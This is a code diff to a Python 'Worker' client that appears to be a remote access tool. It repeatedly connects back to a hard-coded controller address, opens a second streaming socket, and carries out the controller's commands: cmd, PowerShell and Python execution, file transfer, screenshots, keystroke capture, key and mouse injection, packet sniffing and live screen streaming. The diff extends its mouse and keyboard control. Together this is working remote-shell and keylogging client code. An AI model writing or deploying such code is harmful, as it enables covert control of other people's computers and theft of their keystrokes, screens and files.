@@ -44,8 +44,14 @@ def listen_to_keys(doesnt_matter:str)->bytes:
         if key.event_type == "down":
             return f"the key {key.name} was used".encode()
 
-def press_key_in_worker(key:str)->bytes:
-    keyboard.press_and_release(key)
+def press_key_in_worker(key_data:str)->bytes:
+    data = key_data.split(":")
+    type = data[0]
+    key = data[1]
+    if type == "down":
+        keyboard.press(key)
+    else:
+        keyboard.release(key)
     return f"{key} was pressed successfully".encode()
 
 
@@ -69,14 +75,37 @@ def screen_shot(doesnt_matter:str)->bytes:
         decoded_img = file.read()
     return decoded_img
 
-def control_mouse(parameters:str) -> bytes:
-    data = parameters.split(":")
+def button_event(param:bytes):
+    data = param.split(b":")
     mouse = Controller()
-    mouse.position = (data[0],data[1])
-    if data[2] == "left":
-        mouse.press(Button.left)
+    if data[0] == b"down":
+        if data[1] == b"left":
+            mouse.press(Button.left)
+        else:
+            mouse.press(Button.right)
     else:
-        mouse.press(Button.right)
+        if data[1] == b"left":
+            mouse.release(Button.left)
+        else:
+            mouse.release(Button.right)
+
+def scroll_event(param:bytes):
+    delta = struct.unpack('f',param)[0]
+    mouse = Controller()
+    mouse.scroll(0,delta)
+
+def move_event(param:bytes):
+    data = param.split(b":")
+    xp = int.from_bytes(data[0], byteorder="big", signed=False)
+    yp = int.from_bytes(data[1], byteorder="big", signed=False)
+    mouse = Controller()
+    mouse.position = (xp,yp)
+
+def control_mouse(parameters:bytes) -> bytes:
+    options = {b"ButtonEvent":button_event, b"WheelEvent":scroll_event, b"MoveEvent":move_event}
+    data = parameters.split(b":",1)
+    event_name = data[0]
+    options[event_name](data[1])
     return b"mouse was moved successfully"
 
 def sniff_from_worker(parameters:str) -> bytes:
@@ -104,12 +133,19 @@ class Worker:
         self.address = (ip,port)
         self.functions = functions
         self.client = socket.socket()
+        self.stream_client = socket.socket()
+
 
     def connect(self):
         while True:
             try:
                 self.client.connect(self.address)
+                self.client.setsockopt(socket.IPPROTO_TCP,socket.TCP_NODELAY,1)
+
                 self.client.send("connected".encode())
+                self.stream_client.connect((self.address[0],self.address[1]+1))
+                self.stream_client.setsockopt(socket.IPPROTO_TCP,socket.TCP_NODELAY,1)
+
                 print("connection succeeded")
                 break
             except(socket.timeout,socket.error)as e:
@@ -119,33 +155,33 @@ class Worker:
                 self.client = socket.socket()
 
 
-    def sender(self,message:bytes):
+    def sender(self,sock: socket.socket, message:bytes):
         data = struct.pack("I", len(message)) + message
-        self.client.send(data)
+        sock.send(data)
 
-    def recvall(self, size: int) -> bytes:
+    def recvall(self,sock: socket.socket, size: int) -> bytes:
         data = b""
         while len(data) < size:
-            packet = self.client.recv(size - len(data))
+            packet = sock.recv(size - len(data))
             if not packet:
                 return b""
             data += packet
         return data
 
-    def receiver(self) -> bytes:
-        raw_size = self.recvall(4)
+    def receiver(self,sock: socket.socket) -> bytes:
+        raw_size = self.recvall(sock,4)
         if not raw_size:
             return b""
         size = struct.unpack("I", raw_size)[0]
         if size == 0:
             return b""
-        message = self.recvall(size)
+        message = self.recvall(sock, size)
         return message
 
     def run(self):
         self.connect()
         while True:
-            data = self.receiver()
+            data = self.receiver(self.client)
             if data == "quit":
                 break
             if b":" in data:
@@ -155,16 +191,19 @@ class Worker:
             else:
                 name = data.decode()
                 commend = b"doesnt matter"
-            if name == "send_file":
-                message = send_file(commend)
-            else:
-                message = self.functions[name](commend.decode())
-            self.sender(message)
+            if name not in ["send_file","control_mouse"]:
+                commend = commend.decode()
+
+            message = self.functions[name](commend)
+            if name not in ["control_mouse", "press_key_in_worker", "live_stream"]:
+                self.sender(self.client,message)
+            elif name == "live_stream":
+                self.sender(self.stream_client,message)
         self.client.close()
 
 
 def main():
-    ip = "10.0.0.6"
+    ip = "10.0.0.12"
     port = 5555
     functions:dict[str,Callable[[str],bytes]] = {"cmd":cmd,"powershell":powershell,"python":python, "send_file":send_file,"receive_file":receive_file, "screen_shot":screen_shot, "listen_to_keys":listen_to_keys, "press_key_in_worker":press_key_in_worker, "control_mouse":control_mouse,"sniff_from_worker":sniff_from_worker, "live_stream":live_stream}
     worker = Worker(ip, int(port), functions)
